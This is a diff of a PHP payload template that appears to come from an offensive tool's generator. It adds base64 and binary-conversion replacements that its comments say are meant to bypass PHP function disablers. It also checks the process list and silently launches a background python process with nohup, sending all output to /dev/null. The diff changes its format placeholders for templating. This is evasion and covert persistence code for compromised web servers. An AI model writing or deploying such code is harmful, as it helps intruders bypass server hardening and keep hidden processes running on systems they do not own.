@@ -2,6 +2,7 @@
 
 #WARNING: Clean base64id: 55a1983
 #TODO: Fix Windows support.
+
 #`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
 $base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");
 
@@ -34,7 +35,7 @@ function decToBin($dec)
             $binary="1".$binary;
             break;
         }
-        $binary = ($current%2).$binary;
+        $binary = ($current%%2).$binary;
         $current = intval($current/2);
     }
     
@@ -77,9 +78,9 @@ function base64encoding($string)
         $base64.=$value;
     }
 
-    if ((strlen($base64) % 4) != 0)
+    if ((strlen($base64) %% 4) != 0)
     {
-        $base64.=str_repeat("=", 4-(strlen($base64) % 4));
+        $base64.=str_repeat("=", 4-(strlen($base64) %% 4));
     }
 
     return $base64;
@@ -103,9 +104,9 @@ function base64decoding($string)
         $binary.= $idBIN;
     }
     
-    if (strlen($binary) %8 != 0)
+    if (strlen($binary) %%8 != 0)
     {
-        $binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
+        $binary = substr($binary, 0, strlen($binary)-(strlen($binary) %%8));
     }
 
     $array = array();
@@ -258,10 +259,10 @@ foreach($php_functions as $function)
 }
 #<--
 
-$checker = evalRel("ps aux | grep '{} {}'", 1);
+$checker = evalRel("ps aux | grep '%s %s'", 1);
 
 if (strpos($checker, "python") === False)
 {
-    evalRel("nohup python {} {} {} > /dev/null 2>&1 &", 2);
+    evalRel("nohup %s %s %s %s > /dev/null 2>&1 &", 2);
 }
 ?>
